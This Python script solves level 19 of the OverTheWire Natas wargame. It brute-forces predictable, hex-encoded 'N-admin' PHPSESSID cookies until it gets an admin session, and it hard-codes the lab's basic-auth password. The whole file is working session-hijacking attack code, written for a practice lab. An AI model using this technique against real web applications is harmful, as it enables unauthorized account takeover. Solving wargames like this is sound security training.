import requests

headers = {'content-type': 'application/x-www-form-urlencoded'}
url = 'http://natas19.natas.labs.overthewire.org/index.php'
good_string = 'You are an admin.'
max_id = 640

for i in range(max_id) : 
        # 102-admin
        query = str(i) + '-admin'
        print("[+] Trying [query : " + query +"]",end="")
        # converting into hex
        hex_query = query.encode("utf-8").hex()
        #print(hex_query)
        # sending the request
        payload = {'username' : 'admin', 'password' : 'admin'}
        r = requests.post(url, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data=payload, headers=headers, cookies={'PHPSESSID' : hex_query})
        if good_string in r.text : 
                print(" true")
                print(r.text)
                break
        else : 
                print(" false")

#  3238312d61646d696e